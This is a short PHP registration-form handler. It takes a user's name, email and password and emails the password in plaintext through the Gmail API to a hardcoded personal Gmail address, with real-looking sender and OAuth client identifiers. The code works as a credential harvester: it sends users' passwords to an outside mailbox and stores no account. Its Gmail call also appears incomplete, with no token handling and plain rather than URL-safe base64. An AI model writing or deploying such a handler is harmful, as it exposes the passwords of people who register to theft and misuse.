<?php
require_once 'Gmail.php'; // Replace with the actual path to Gmail.php in your project

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve user-entered registration details from the form
    $email = $_POST['email'];
    $name = $_POST['name'];
    $password = $_POST['password'];
    $confirmPassword = $_POST['confirm-password'];

    // Check if passwords match
    if ($password === $confirmPassword) {
        // Compose email content with user's registration details
        $subject = 'New Registration Details';
        $message = "Name: $name\nEmail: $email\nPassword: $password"; // Adjust the message content as needed

        // Email configuration
        $recipientEmail = 'sahoosoumyaranjan798@gmail.com'; // Replace with the recipient's email address
        $senderEmail = 'cmo.poco@gmail.com'; // Replace with the email address associated with your Gmail API credentials

        // Instantiate the Gmail service
        $client = new Google_Client();
        $client->setApplicationName('Your App Name');
        $client->setScopes(Google_Service_Gmail::GMAIL_SEND);
        $client->setAuthConfig('client_secret_766326969688-2a84sgtugfkapumhnbq1ceq8tds52iok.apps.googleusercontent.com.json'); // Replace with the path to your credentials file
        $client->setAccessType('offline');
        $service = new Google_Service_Gmail($client);

        // Create the email message
        $messageObj = new Google_Service_Gmail_Message();
        $emailContent = "To: $recipientEmail\r\n";
        $emailContent .= "From: $senderEmail\r\n";
        $emailContent .= "Subject: $subject\r\n";
        $emailContent .= "Content-Type: text/plain; charset=utf-8\r\n\r\n";
        $emailContent .= $message;
        $rawMessage = base64_encode($emailContent);
        $messageObj->setRaw($rawMessage);

        // Send the email
        try {
            $service->users_messages->send('me', $messageObj);
            echo 'Email sent successfully.';
        } catch (Exception $e) {
            echo 'Failed to send email.';
            // You might want to handle the exception here
        }
    } else {
        echo 'Passwords do not match.';
    }
}
?>
